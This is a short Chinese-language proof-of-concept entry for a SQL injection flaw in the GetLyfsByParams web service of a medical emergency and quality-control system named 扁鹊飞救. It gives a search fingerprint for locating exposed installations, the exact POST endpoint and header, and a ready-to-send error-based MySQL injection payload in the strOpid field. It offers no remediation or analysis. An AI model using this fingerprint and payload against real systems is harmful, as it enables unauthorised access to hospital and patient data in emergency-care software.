# 扁鹊飞救智能急救与质控系统GetLyfsByParamsSQL注入漏洞

- **系统**：扁鹊飞救智能急救与质控系统GetLyfsByParams　|　**类型**：SQL注入　|　**CVE**：—
- **指纹**：`icon_hash="-757866684"`
- **请求**：`POST /AppService/BQMedical/WebServiceForFirstaidApp.asmx/GetLyfsByParams HTTP/1.1`
- **关键头**：`Content-Type: application/x-www-form-urlencoded`

**请求体 / payload**
```
strOpid=1 AND (SELECT 9054 FROM(SELECT COUNT(*),CONCAT(0x717a767671,(SELECT (ELT(9054=9054,1))),0x717a707a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)&strTempID=1&strNumber=&strUnit=
```
- **预期**：200　|　—